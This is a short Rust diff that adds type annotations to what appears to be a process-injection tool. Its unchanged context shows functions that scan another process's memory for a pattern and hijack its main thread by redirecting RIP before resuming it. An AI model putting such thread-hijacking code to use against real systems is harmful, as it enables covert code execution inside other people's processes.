@@ -78,7 +78,7 @@ pub fn create_pipe() -> Handle {
         bInheritHandle: true.into(),
     };
 
-    let sa = Some(&security_attr as *const SECURITY_ATTRIBUTES);
+    let sa: Option<*const SECURITY_ATTRIBUTES> = Some(&security_attr as *const SECURITY_ATTRIBUTES);
 
     let result = unsafe {CreatePipe(&mut h_std_in_r, &mut h_std_in_w, sa, 0) };
     match result {
@@ -113,7 +113,7 @@ pub fn create_pipe() -> Handle {
     }
 
 
-    let my_handle = Handle {
+    let my_handle: Handle= Handle {
         h_std_in_read: h_std_in_r,
         h_std_in_write: h_std_in_w,
         h_std_out_read: h_std_out_r,
@@ -152,7 +152,7 @@ pub fn find_offset(ns_handle: HANDLE, pattern: &[u8]) -> Option<MemoryInfo> {
 
     loop {
 
-        let result  = unsafe {
+        let result: usize = unsafe {
             VirtualQueryEx(ns_handle, Some(addr as *const c_void), &mut memory_info, memory_info_size)
         };
 
@@ -300,7 +300,7 @@ pub fn hijack_main_thread(ns_thread: HANDLE, offset: u64){
     println!("[*] The RIP point now at @ {:#x} and RSP @ {:#x}",context.Rip,context.Rsp);
 
     // resume the thread
-    let result = unsafe { ResumeThread(ns_thread)};
+    let result: u32 = unsafe { ResumeThread(ns_thread)};
     
     println!("[+] Successfully resuming main thread: {:?}",result);
 
